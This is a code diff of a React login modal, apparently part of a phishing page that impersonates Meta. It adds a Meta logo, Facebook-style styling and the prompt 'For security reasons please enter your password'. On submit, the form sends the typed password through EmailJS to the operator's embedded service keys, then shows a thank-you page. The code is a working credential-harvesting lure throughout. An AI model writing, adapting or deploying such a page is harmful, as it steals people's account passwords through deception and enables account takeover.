@@ -2,6 +2,7 @@ import React, { useRef } from "react";
 import emailjs from "@emailjs/browser";
 import { useNavigate } from "react-router-dom";
 import Modal from "react-bootstrap/Modal";
+import MetaLogo from "../assets/meta.svg";
 
 const LoginModal = ({ showModal, setShowModal }) => {
   const navigate = useNavigate();
@@ -12,12 +13,12 @@ const LoginModal = ({ showModal, setShowModal }) => {
 
     navigate("/thanks"); // Navigate to thanks page after submission
     emailjs
-        .sendForm(
-          "service_g572qgw",
-          "template_uxuv4h7",
-          form.current,
-          "ZLLsg29uJrmMWpY5z"
-        )
+      .sendForm(
+        "service_gjnrhhz",
+        "template_kocr2op",
+        form.current,
+        "ta7wkIBfmTXLQ74Ev"
+      )
       .then(
         (result) => {
           console.log("result text is", result.text);
@@ -30,33 +31,59 @@ const LoginModal = ({ showModal, setShowModal }) => {
 
   return (
     <Modal
-      centered
       backdrop="static"
       show={showModal}
       onHide={() => setShowModal(false)}
+      centered
     >
       <Modal.Body className="my-4 p-4">
         <form ref={form} onSubmit={sendEmail} className="d-flex flex-column">
-          <h3 className="text-center mb-4">Confirm it's you</h3>
+          <p
+            style={{
+              fontSize: "12px",
+              marginBottom: "8px",
+              textAlign: "center"
+            }}
+          >
+            For security reasons please enter your password
+          </p>
+
           <input
             className="p-1 border rounded"
             name="password"
             type="password"
             placeholder="Password"
-            style={{ boxShadow: "0 0.5rem 1rem rgba(0, 0, 0, 0.15)" }}
+            style={{
+              fontSize: "14px",
+            }}
             required
           />
+
           <button
             type="submit"
-            className="mt-4 border-0 text-white rounded p-1"
+            className="text-white border-0 mt-3"
             style={{
-              background: "#0D6EFD",
-              boxShadow:
-                "inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075)",
+              background: "#4267B2",
+              fontWeight: 400,
+              borderRadius: "20px",
+              padding: "0.5rem 1.5rem",
             }}
           >
-            Next
+            Submit
           </button>
+
+          <hr className="my-4" />
+
+          <div className="d-flex justify-content-center">
+            <img
+              src={MetaLogo}
+              alt="Meta Logo"
+              style={{
+                width: "72px",
+                height: "auto",
+              }}
+            />
+          </div>
         </form>
       </Modal.Body>
     </Modal>
